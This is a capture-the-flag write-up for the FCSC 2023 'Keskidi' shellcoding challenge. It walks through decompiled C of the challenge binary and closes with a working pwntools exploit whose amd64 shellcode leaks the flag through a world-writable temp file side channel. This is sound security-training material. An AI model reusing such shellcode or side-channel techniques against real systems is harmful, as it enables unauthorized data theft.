## KESKIDI

was a shellcoding challenge from FCSC 2023 edition.

this one was a bit harder than the last year edition shellcoding challenge (Palindrome)

------

### 1- So...what ?

let's have a look to the reverse of `main()` function:

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  _QWORD *v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  __int64 v18; // rbx
  __int64 v19; // rbx
  int urandom_fd; // [rsp+Ch] [rbp-154h]
  __pid_t pid; // [rsp+10h] [rbp-150h]
  int v22; // [rsp+14h] [rbp-14Ch]
  unsigned __int64 i; // [rsp+18h] [rbp-148h]
  char templatea[32]; // [rsp+20h] [rbp-140h] BYREF
  __int64 buf[35]; // [rsp+40h] [rbp-120h] BYREF

  buf[33] = __readfsqword(0x28u);
  strcpy(templatea, "/tmp/fcsc2023-keskidi-XXXXXX");
  signal(14, (__sighandler_t)handler);
  alarm(0x3Cu);
  urandom_fd = open("/dev/urandom", 0);	// open /dev/urandom device
  if ( urandom_fd == -1 )
  {
    perror("open");
    exit(1);
  }
  tempfile_fd = mkstemp(templatea);  // generate a temp file from the template, and open it
  if ( tempfile_fd == -1 )
  {
    perror("mkstemp");
    exit(1);
  }
  if ( fchmod(tempfile_fd, 0666u) == -1 )  // make it writable by everybody (that's important)
  {
    perror("fchmod");
    exit(1);
  }
  if ( unlink(templatea) == -1 )	// file will be deleted when closed
  {
    perror("unlink");
    exit(1);
  }
  for ( i = 0LL; i <= 0xF; ++i )			// basically read 4096 bytes from /dev/urandom (16*256)
  {
    v22 = read(urandom_fd, buf, 0x100uLL);		// read 0x100 bytes each times
    if ( v22 == -1 )
    {
      perror("read");
      exit(1);
    }
    if ( write(tempfile_fd, buf, v22) != v22 )		// write 0x100 bytes read to the temp file
    {
      perror("write");
      exit(1);
    }
    v3 = (_QWORD *)((char *)&unk_4060 + 256 * i);  // copy the random data to .bss
    v4 = buf[1];									// what an ugly reverse no?
    *v3 = buf[0];
    v3[1] = v4;
    v5 = buf[3];
    v3[2] = buf[2];
    v3[3] = v5;
    v6 = buf[5];
    v3[4] = buf[4];
    v3[5] = v6;
    v7 = buf[7];
    v3[6] = buf[6];
    v3[7] = v7;
    v8 = buf[9];
    v3[8] = buf[8];
    v3[9] = v8;
    v9 = buf[11];
    v3[10] = buf[10];
    v3[11] = v9;
    v10 = buf[13];
    v3[12] = buf[12];
    v3[13] = v10;
    v11 = buf[15];
    v3[14] = buf[14];
    v3[15] = v11;
    v12 = buf[17];
    v3[16] = buf[16];
    v3[17] = v12;
    v13 = buf[19];
    v3[18] = buf[18];
    v3[19] = v13;
    v14 = buf[21];
    v3[20] = buf[20];
    v3[21] = v14;
    v15 = buf[23];
    v3[22] = buf[22];
    v3[23] = v15;
    v16 = buf[25];
    v3[24] = buf[24];
    v3[25] = v16;
    v17 = buf[27];
    v3[26] = buf[26];
    v3[27] = v17;
    v18 = buf[29];
    v3[28] = buf[28];
    v3[29] = v18;
    v19 = buf[31];
    v3[30] = buf[30];
    v3[31] = v19;
  }
  if ( close(urandom_fd) == -1 )	// close /dev/urandom fd (not the temp file..)
  {
    perror("close");
    exit(1);
  }
  pid = fork();			// so we fork
  if ( pid == -1 )
  {
    perror("fork");
    exit(1);
  }
  if ( !pid )
    child_12B9();		// child goes there
  sleep(1u);			// a 1 second pause before entering parent function
  parent_13CA(pid);		// parent goes there
}
```

Well IDA decompiler is a not at his top.. but it's enough simple to be understandable:

A temporary file with a name based on this template `/tmp/fcsc2023-keskidi-XXXXXX`is created, his filedescriptor is stored in `.bss`

set the permission access to the temp file to "everybody can read it and write it".. (bad idea), and to be deleted when his filedescriptor will be closed

open `/dev/urandom`

read 4096 of random data from `/dev/urandom` and copy it to the temporary file, and to the `.bss`

close `/dev/urandom` but keep temporary file filedescriptor open

`fork()` child goes directly to `child_12B9()` function,  parent waits 1 second before going to `parent_13CA()`  function.

------

### 2- What the parent does ?

Well,  let's have a look to what `parent_13CA(int pid) ` function does:

```c
void __fastcall __noreturn parent_13CA(__pid_t pid)
{
  int fileDescriptor; // [rsp+14h] [rbp-ACh]
  int readResult; // [rsp+18h] [rbp-A8h]
  int stringLength; // [rsp+1Ch] [rbp-A4h]
  __int64 index; // [rsp+20h] [rbp-A0h]
  char *searchPtr; // [rsp+28h] [rbp-98h]
  char buffer[136]; // [rsp+30h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+B8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  fileDescriptor = open("flag.txt", 0);		// open the flag.txt file containing the precious flag
  if ( fileDescriptor == -1 )
  {
    perror("open");
    exit(1);
  }
  readResult = read(fileDescriptor, buffer, 0x80uLL);		// read it in the buffer on stack
  if ( readResult <= 0 )
  {
    perror("read");
    exit(1);
  }
  if ( readResult != 70 )							// the length of the flag must be 70 chars.
  {
    perror("read: the flag must be 70-char long.");
    exit(1);
  }
  if ( close(fileDescriptor) == -1 )			// close the flag file filedescriptor
  {
    perror("close");
    exit(1);
  }
  buffer[70] = 0;						// zero terminate flag on stack.
  stringLength = strlen(buffer);
  for ( index = 0LL; index < stringLength; ++index ) // this loop zero the chars occurrences of flag in temporary file
  {
    searchPtr = (char *)&unk_4060;
    do
    {
      searchPtr = (char *)memchr(searchPtr, buffer[index], 4096 - (searchPtr - (char *)&unk_4060));
      if ( searchPtr )
      {
        lseek(tempfile_fd, searchPtr - (char *)&unk_4060, 0);	// seek to position in temporary file
        write(tempfile_fd, &unk_2063, 1uLL);		// zero out byte in temporary file
        syncfs(tempfile_fd);			// force syncing data
        ++searchPtr;
      }
    }
    while ( searchPtr );
  }
  if ( close(tempfile_fd) == -1 )		// close temporary file
  {
    perror("close input");
    exit(1);
  }
  if ( waitpid(pid, 0LL, 0) == -1 )  // wait for child to finish
  {
    perror("wait");
    exit(1);
  }
  exit(0);
}
```

Here is what parent does:

* open the `flag.txt` file containing our precious flag, and store it on stack.

* search for occurrences of each character of the flag in the random data,  and zero out the occurrence in the temporary file, does this   from the first char to the last char of the flag. Each time it clears an occurrence in the file, force syncing data , writing them to the file.

* when it has finished, it closes the temporary file (which will be deleted, and wait for the child to finish

  

------

### 3- So what is doing the child during this time ?

Let's have a look what is the `child__12B9()` function doing:

```c
void __noreturn child_12B9()
{
  __uid_t currentUid; // r12d
  __uid_t previousUid; // ebx
  __uid_t newUid; // eax
  void *shellcode; // [rsp+10h] [rbp-20h]

  currentUid = getuid();
  previousUid = getuid();
  newUid = getuid();
  if ( setresuid(newUid, previousUid, currentUid) == -1 )// drop privilege
  {
    perror("setresuid");
    exit(1);
  }
  shellcode = mmap(0LL, 0x100uLL, 3, 34, -1, 0LL);
  if ( shellcode == (void *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  if ( (unsigned int)read(0, shellcode, 0x100uLL) == -1 )// read our shellcode (up to 0x100 bytes)
  {
    perror("read");
    exit(1);
  }
  if ( mprotect(shellcode, 0x100uLL, PROT_EXEC) == -1 )// change shellcode memory protection to EXEC only (no read/write)
  {
    perror("mprotect");
    exit(1);
  }
  ((void (*)(void))shellcode)();
  exit(0);
}
```

So the child , basically drop provileges, read a shellcode in a memory mapped zone, remaps it to EXEC only, before executing it..

pretty simple as you can see.

------

### 4- So what's the plan?

Well, the child does not have the right to read the flag directly, he does not have the right to read the parent memory , via `/proc/pid/mem `or via `ptrace` the only way to interact with the flag, is via the temporary file that the parent start (1 second later than our shellcode start) to erase each flag chars occurences one by one..

so here is the plan I found to dump the flag:

1. The child dump the random data original state in the `.bss` to `stdout`, like this we know the initial state of the temporary file.
2. it renice the parent to slow it down a bit..
3. it wait a bit the parent start to read the flag and erase char occurrence in temporary file.
4. overwrite temporary file with the original random data we save at beginning , as the temporary file is writable by us, it will reset to initial state.
5. wait a amount of time, during which the parent will continue erasing char occurrences.
6. dump again the temporary file to `stdout`, and calculate difference with the original one, to find which character is being erased.. then loop to overwrite (number 4)

Like this we will see appearing characters one by one..

here is the working exploit:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("keskidi")

host, port = "challenges.france-cybersecurity-challenge.fr", "2103"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

shellc = asm('''
 push 110
  pop rax
  syscall
  cld
  push rax

  // renice parent
  xor edi,edi
  mov esi,eax
  mov edx,4
  mov eax,141
  syscall
  pop rax

  // output orig random
  mov r10,[rsp]
  add r10,(0x4060-0x13c0) 
  mov edi,1
  mov rsi,r10
  mov edx,0x1000
  mov eax,1
  syscall

  // sleep until parent start working
  mov eax,35
  mov rcx,500000000
  push rcx
  push 2
  mov rdi,rsp
  syscall

rewrite:
  // set offset to 0
  mov edi,[r10-0x20]
  xor esi,esi
  xor edx,edx
  mov eax,8
  syscall

  // rewrite temp file
  mov edi,[r10-0x20]
  mov rsi,r10
  mov edx,0x1000
  mov eax,1
  syscall

  mov rdi,[r10-0x20]
  mov eax,74
  syscall

rewrite2:
  // nanosleep wait parent works a bit
  mov eax,35
  mov rcx,100000000
  push rcx
  push 0
  mov rdi,rsp
  syscall

  // set offset to 0
  mov edi,[r10-0x20]
  xor esi,esi
  xor edx,edx
  push 8
  pop rax
  syscall

  // dump temp file again
  mov edi,[r10-0x20]
  lea rsi,[rsp-0x1100]
  mov edx,0x1000
  xor eax,eax
  syscall
  mov edx,eax
  push 1
  pop rax
  push 1
  pop rdi
  syscall

  jmp rewrite


''')

p.send(shellc)
buff = b''
size = 0x1000
while size>0:
  temp = p.recv(size)
  size -= len(temp)
  buff += temp

print('base random received')
#print(hexdump(buff))

for i in range(100):
#  print('-'*100)
  buff2 = b''
  size = 0x1000
  while size>0:
    temp = p.recv(size)
    size -= len(temp)
    buff2 += temp

  diff = b''
  for i in range(4096):
    if (buff[i:i+1] != buff2[i:i+1]):
      if buff[i:i+1] not in diff:
        diff += buff[i:i+1]

  print(diff)
  print('diff len='+str(len(diff)))    

p.interactive()
```

The various waiting time, and renice value need to be adjusted depending on server workload..

sometimes it does not work anymore, highly unreliable..

sometimes it works well..

so I had to dump it in many part..to assemble the result.

anyway that worked..

